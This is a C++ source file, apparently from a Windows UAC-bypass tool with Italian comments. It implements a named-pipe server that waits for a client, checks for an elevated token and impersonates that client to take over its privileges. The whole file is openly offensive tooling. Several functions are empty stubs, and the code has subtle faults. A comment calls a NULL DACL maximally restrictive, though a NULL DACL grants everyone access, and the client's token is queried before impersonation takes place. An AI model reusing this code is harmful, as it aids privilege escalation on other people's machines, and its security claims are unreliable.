#include "../include/NamedPipeImpersonation.h"
#include <sddl.h>
#include <memory>
#include <algorithm>

namespace uac_bypass {

NamedPipeImpersonation::NamedPipeImpersonation() 
    : logger(Logger::getInstance()),
      initialized(false) {
    
    // Inizializza dettagli pipe
    pipeDetails.pipeHandle = INVALID_HANDLE_VALUE;
    pipeDetails.maxInstances = PIPE_MAX_INSTANCES;
    pipeDetails.outBufferSize = PIPE_DEFAULT_BUFFER_SIZE;
    pipeDetails.inBufferSize = PIPE_DEFAULT_BUFFER_SIZE;
    pipeDetails.defaultTimeout = PIPE_DEFAULT_TIMEOUT;
}

NamedPipeImpersonation::~NamedPipeImpersonation() {
    cleanup();
}

NamedPipeImpersonation& NamedPipeImpersonation::getInstance() {
    static NamedPipeImpersonation instance;
    return instance;
}

bool NamedPipeImpersonation::initialize() {
    if (initialized) return true;
    
    logger.logInfo(L"Inizializzazione NamedPipeImpersonation");
    
    // Genera nome pipe univoco
    if (!generatePipeName()) {
        logger.logError(L"Generazione nome pipe fallita");
        return false;
    }
    
    // Setup sicurezza pipe
    if (!setupPipeSecurity()) {
        logger.logError(L"Setup sicurezza pipe fallito");
        return false;
    }
    
    initialized = true;
    return true;
}

bool NamedPipeImpersonation::createElevatedPipe() {
    if (!initialized && !initialize()) return false;
    
    logger.logInfo(L"Creazione pipe elevata");
    
    // Crea pipe con sicurezza elevata
    if (!createNamedPipe(pipeDetails.pipeName)) {
        logger.logError(L"Creazione pipe fallita");
        return false;
    }
    
    // Configura modalità pipe
    if (!configurePipeMode()) {
        logger.logError(L"Configurazione pipe fallita");
        cleanup();
        return false;
    }
    
    return true;
}

bool NamedPipeImpersonation::connectAndImpersonate() {
    if (!initialized) return false;
    
    logger.logInfo(L"Connessione e impersonazione client");
    
    // Attendi connessione client
    if (!connectNamedPipe()) {
        logger.logError(L"Connessione pipe fallita");
        return false;
    }
    
    // Verifica identità client
    if (!verifyClientIdentity()) {
        logger.logError(L"Verifica client fallita");
        disconnectNamedPipe();
        return false;
    }
    
    // Impersona client
    if (!impersonateClient()) {
        logger.logError(L"Impersonazione client fallita");
        disconnectNamedPipe();
        return false;
    }
    
    return true;
}

bool NamedPipeImpersonation::cleanup() {
    // Disconnetti client
    disconnectNamedPipe();
    
    // Chiudi handle pipe
    if (pipeDetails.pipeHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(pipeDetails.pipeHandle);
        pipeDetails.pipeHandle = INVALID_HANDLE_VALUE;
    }
    
    // Pulisci lista client
    connectedClients.clear();
    
    initialized = false;
    return true;
}

bool NamedPipeImpersonation::createNamedPipe(const std::wstring& pipeName) {
    // Verifica disponibilità nome pipe
    if (!isPipeAvailable(pipeName)) {
        return false;
    }
    
    // Crea pipe con attributi di sicurezza
    SECURITY_ATTRIBUTES sa = { sizeof(sa) };
    if (!setupPipeAttributes()) {
        return false;
    }
    
    pipeDetails.pipeHandle = CreateNamedPipeW(
        pipeName.c_str(),
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        pipeDetails.maxInstances,
        pipeDetails.outBufferSize,
        pipeDetails.inBufferSize,
        pipeDetails.defaultTimeout,
        &sa
    );
    
    return pipeDetails.pipeHandle != INVALID_HANDLE_VALUE;
}

bool NamedPipeImpersonation::connectNamedPipe() {
    if (pipeDetails.pipeHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    // Crea evento per operazione asincrona
    HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!hEvent) return false;
    
    std::unique_ptr<void, decltype(&CloseHandle)> eventGuard(hEvent, CloseHandle);
    
    // Inizia operazione asincrona
    OVERLAPPED overlapped = { 0 };
    overlapped.hEvent = hEvent;
    
    if (!ConnectNamedPipe(pipeDetails.pipeHandle, &overlapped)) {
        DWORD error = GetLastError();
        if (error != ERROR_IO_PENDING && error != ERROR_PIPE_CONNECTED) {
            return false;
        }
    }
    
    // Attendi completamento
    return WaitForSingleObject(hEvent, pipeDetails.defaultTimeout) == WAIT_OBJECT_0;
}

bool NamedPipeImpersonation::disconnectNamedPipe() {
    if (pipeDetails.pipeHandle == INVALID_HANDLE_VALUE) {
        return true;
    }
    
    // Termina impersonazione
    RevertToSelf();
    
    // Disconnetti pipe
    return DisconnectNamedPipe(pipeDetails.pipeHandle) != FALSE;
}

bool NamedPipeImpersonation::impersonateClient() {
    if (pipeDetails.pipeHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    // Impersona client connesso
    if (!ImpersonateNamedPipeClient(pipeDetails.pipeHandle)) {
        return false;
    }
    
    // Verifica token impersonazione
    HANDLE hToken;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
        RevertToSelf();
        return false;
    }
    
    CloseHandle(hToken);
    return true;
}

bool NamedPipeImpersonation::writeToPipe(const std::vector<BYTE>& data) {
    if (pipeDetails.pipeHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    DWORD bytesWritten;
    return WriteFile(
        pipeDetails.pipeHandle,
        data.data(),
        static_cast<DWORD>(data.size()),
        &bytesWritten,
        NULL
    ) != FALSE;
}

bool NamedPipeImpersonation::readFromPipe(std::vector<BYTE>& data) {
    if (pipeDetails.pipeHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    data.resize(PIPE_DEFAULT_BUFFER_SIZE);
    DWORD bytesRead;
    
    if (!ReadFile(
        pipeDetails.pipeHandle,
        data.data(),
        static_cast<DWORD>(data.size()),
        &bytesRead,
        NULL
    )) {
        return false;
    }
    
    data.resize(bytesRead);
    return true;
}

bool NamedPipeImpersonation::flushPipe() {
    if (pipeDetails.pipeHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    return FlushFileBuffers(pipeDetails.pipeHandle) != FALSE;
}

bool NamedPipeImpersonation::setPipeMode(DWORD mode) {
    if (pipeDetails.pipeHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    DWORD currentMode;
    if (!GetNamedPipeHandleStateW(
        pipeDetails.pipeHandle,
        &currentMode,
        NULL, NULL, NULL, NULL, 0
    )) {
        return false;
    }
    
    return SetNamedPipeHandleState(
        pipeDetails.pipeHandle,
        &mode,
        NULL,
        NULL
    ) != FALSE;
}

bool NamedPipeImpersonation::setupPipeSecurity() {
    // Crea security descriptor con DACL ristretta
    SECURITY_DESCRIPTOR sd;
    if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
        return false;
    }
    
    // Imposta DACL vuota per massima restrizione
    if (!SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE)) {
        return false;
    }
    
    return true;
}

bool NamedPipeImpersonation::setupPipeAttributes() {
    // Configura attributi pipe
    return true;
}

bool NamedPipeImpersonation::configurePipeMode() {
    // Configura modalità pipe
    return setPipeMode(PIPE_READMODE_MESSAGE | PIPE_WAIT);
}

bool NamedPipeImpersonation::initializePipeBuffers() {
    // Inizializza buffer pipe
    return true;
}

bool NamedPipeImpersonation::waitForClient() {
    // Attendi connessione client
    return true;
}

bool NamedPipeImpersonation::verifyClientIdentity() {
    if (pipeDetails.pipeHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    // Ottieni info client
    PipeClient client;
    if (!getClientInfo(client)) {
        return false;
    }
    
    // Verifica elevazione
    if (!client.isElevated) {
        return false;
    }
    
    connectedClients.push_back(client);
    return true;
}

bool NamedPipeImpersonation::getClientInfo(PipeClient& client) {
    HANDLE hToken;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
        return false;
    }
    
    std::unique_ptr<void, decltype(&CloseHandle)> tokenGuard(hToken, CloseHandle);
    
    // Ottieni PID processo client
    DWORD pid;
    if (!GetNamedPipeClientProcessId(pipeDetails.pipeHandle, &pid)) {
        return false;
    }
    client.processId = pid;
    
    // Ottieni SID processo client
    if (!GetNamedPipeClientSessionId(pipeDetails.pipeHandle, &client.sessionId)) {
        return false;
    }
    
    // Verifica elevazione token
    client.isElevated = isClientElevated(hToken);
    
    return true;
}

bool NamedPipeImpersonation::isClientElevated(HANDLE clientToken) {
    TOKEN_ELEVATION elevation;
    DWORD size;
    
    if (!GetTokenInformation(clientToken, TokenElevation,
        &elevation, sizeof(elevation), &size)) {
        return false;
    }
    
    return elevation.TokenIsElevated != 0;
}

bool NamedPipeImpersonation::protectPipe() {
    // Proteggi pipe da accessi non autorizzati
    return true;
}

bool NamedPipeImpersonation::monitorPipeAccess() {
    // Monitora accessi alla pipe
    return true;
}

bool NamedPipeImpersonation::validatePipeState() {
    // Verifica stato pipe
    return true;
}

bool NamedPipeImpersonation::handlePipeError() {
    // Gestisci errori pipe
    return true;
}

bool NamedPipeImpersonation::generatePipeName() {
    // Genera nome pipe univoco
    WCHAR tempPath[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tempPath)) {
        return false;
    }
    
    std::wstring pipeName = L"\\\\.\\pipe\\uac_bypass_";
    pipeName += std::to_wstring(GetTickCount64());
    
    pipeDetails.pipeName = pipeName;
    return true;
}

bool NamedPipeImpersonation::setPipeTimeout(DWORD timeout) {
    if (pipeDetails.pipeHandle == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    return SetNamedPipeHandleState(
        pipeDetails.pipeHandle,
        NULL,
        &timeout,
        NULL
    ) != FALSE;
}

bool NamedPipeImpersonation::setPipeBufferSize(DWORD size) {
    // Imposta dimensione buffer pipe
    return true;
}

bool NamedPipeImpersonation::isPipeAvailable(const std::wstring& pipeName) {
    // Verifica se il nome pipe è già in uso
    HANDLE hPipe = CreateFileW(
        pipeName.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hPipe != INVALID_HANDLE_VALUE) {
        CloseHandle(hPipe);
        return false;
    }
    
    return GetLastError() == ERROR_FILE_NOT_FOUND;
}

} // namespace uac_bypass